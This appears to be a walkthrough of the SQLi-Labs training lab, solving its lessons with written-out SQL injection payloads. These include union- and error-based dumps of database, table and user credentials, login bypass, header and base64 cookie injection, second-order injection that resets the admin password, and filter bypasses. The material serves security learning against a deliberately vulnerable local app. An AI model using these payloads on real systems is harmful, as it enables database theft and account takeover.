__SQLI LABS__
==========
First we have to setup the lab:

* install apache2 webserver by ```>sudo apt install apache2```
* install mysql by ```>sudo apt-get install mysql-srver```
* install php7
* git clone the repository of the lab and start all the service required

#OBJECTIVE
==========
_dump the contents of the databse using sqli_
 
##LESS-1
========
* first we have to pass the ```?id=``` parameter and pass a numeric value
* fuzz the parameter to get sqli
* when we put ```'``` we get sql error thus we have a sql injection we can comment ou the rest of the query by ```-- -```or ```--+``` or any comments in sql
* then we can dump the contents

 ##payloads to dump
---------------------
check no: of table included 	=```/?id=1'order by 1,2,3,4--+"```

to find the name of data base	= ```/id=-1' union select 1,database(),3--+```
to find table name 	    	= ```/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+```

to find the column name	    	=```/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+```

to find the data 	    	=``` /?id=-1' union select 1,group_concat(username),group_concat(password) from users```

contents of database
--------------------
* name of database=security
* tables		=emails,referers,uagents,users
* columns		=CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,USER,id,password,username
* usernames	=Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
* password	=Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4  

##LESS-2
========
* when we fuzz the id parameter this time single qot(') i.e ``` ?id=1' ```does not work
* when we put a ```'``` before and after the 1 it worked i.e ```?id='1'```
* we can now comment ```--+``` rest and dump teh database using the same payloads (change 1' => '1') from lesson 1

#PAYLOAD EXAMPLE
=================

to find the data 	    	=``` /?id='-1' union select 1,group_concat(id),group_concat(email) from emails```

contents of database
--------------------
* name of database=security
* tables          =emails,referers,uagents,users
* columns in email=email_id,id
* id	            	=1,2,3,4,5,6,7,8
* email=Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com 


##LESS-3
========
* in this lesson when we fuzz the id parameter we can find ``` ') ```  is used to take our input so we can use ``` ') ```  as payload
* then comment it and do the same payload form less-1

##PAYLOAD EXAMPLE
=================

to find the data 	    	=``` /?id=-1') union select 1,group_concat(username),3 from users```

contents of database
--------------------
name of database=security
tables          =emails,referers,uagents,users
columns in uagents=id,ip_address,uagent,username

LESS-4
======
* in this challenge we have to use ' ") ' as payload
* we can use 'and' or 'or' to complete the query insted of commenting

##PAYLOAD EXAMPLE
=================

to find the data 	    	=``` /?id=-1") union select 1,group_concat(username),group_concat(password) from users```

contents of database
--------------------
* name of database=security
* tables		=emails,referers,uagents,users
* columns in referer=id,ip_address,referer


LESS-5
======
* In this challenge we don't  get any response form the databse directy to the browser
* but we get the error when we break the query,so we can dump the database through the error
* we can use rand(),floor(),count() to get error


payloads
---------
this will get database  =```/?id=1' AND (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b)--+```

to get table names      =```/?id=1' AND (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+```

to get columns          =```/?id=1' AND (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_name='emails' limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+```

contents of database
--------------------
* databse=security
* tables=emails
* columns=id

less-11
=======
In the sql-injection is in the loging form the form the user inputs are not validated so we can inject sql query in the username and password feilds

payload :
note we can see that ``'`` is used in the query
* username = ``' or 1=1#`` gives the output :

![image](https://user-images.githubusercontent.com/61080375/114434498-b49b7a80-9be0-11eb-90d8-a5fcc6d72aa2.png)


we logged in as the first user in the database

* using order by we can find that here 2 columns are used
* username = ``' order by 1,2#`` => gives no error
* username = ``' order by 1,2,3#`` =>  gives error
* so two columns are used ,therefore  we can use two columns in union select
* username =``' union select 1,database()#``

![image](https://user-images.githubusercontent.com/61080375/114434423-9f265080-9be0-11eb-8cec-567aef71e696.png)

* username = ``' union select group_concat(username),group_concat(password) from users#``

![image](https://user-images.githubusercontent.com/61080375/114437862-b5cea680-9be4-11eb-8771-72fd9d52e082.png)



less-18
========

this is a header based injection and you can inject query in the user agent feild in the request (you need an intercepting proxy like burp or zap proxy for that)

payload
-------

* to get the data base we can use this payload
```mysql
' and (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b) and '1'='1
```
less-20
=======

form the soruce cose we can see that there it's is fecting data from database using our cookie value so we can inject sql quries in the cookie value

payload

![image](https://user-images.githubusercontent.com/61080375/110950149-7b65b580-8369-11eb-8abd-8306165ba3da.png)

less-21
=======

In this we have to base 64 encode our payload and set it as cookiee
payload example:
YWRtaW5uJyl1bmlvbiBzZWxlY3QgMSwyLDMj : adminn')union select 1,2,3# 

less-22
=======

This is also cookiee based injection where cookie is base64 encoded 
here " was used in the query

payload example

YWRtaW5uIiB1bmlvbiBzZWxlY3QgMSwyLDMj :  adminn" union select 1,2,3#

less-23
=======

This was error based injection but we comment ['#','--'] was filtered
 but we can get injection
 
 payload : ?id=-1'%20 union select 1,database(),3 or%20 '1'='1

less-24
=======
 In this challenge we don't have injection directly in any forms but in this we have a feature to change password of the user logged in,we can use second order injection 
 it takes the ``username`` form the database directly from database and it password on the update query without any validation 
 so we can register a user with the username as our payload so when it takes to update query it will be exicuted
 
 **Exploitaion**
 * Register a user with username = ``admin'#``
 * change the password
   ``in the update query username='admin'# so admins password will be changed``
 * login as admin with the new password
 
 less-25
 =======
 
 In this there are some filters in the ``id`` parameter so  we want to bypass that 
 we can use ``||`` insted of ``OR`` and ``&&`` instead of ``AND``
 SO payload will be ``?id=1' || 1=1 --+`` ,``?id=1' %26%26 1=1 --+``
 
 less-26
 =======
 
 In this lesson the comments and spaces are also filtered so we have to bypass that also to get sql injection
 * To bypass comment we can use ``'1`` at the end so the backend will add a ``'`` and it becomes ``'1'``
 * To bypass spaces we can use a non printable character such ``%0a`` or ``%0b`` which will acts as a space at the backend
 payload:**?id='%0Bunion%0Bselect%0B1,database(),3%0B%26%26%0B'1**
![image](https://user-images.githubusercontent.com/61080375/114918934-4acfda80-9e45-11eb-9652-e6cf6b5106f9.png)
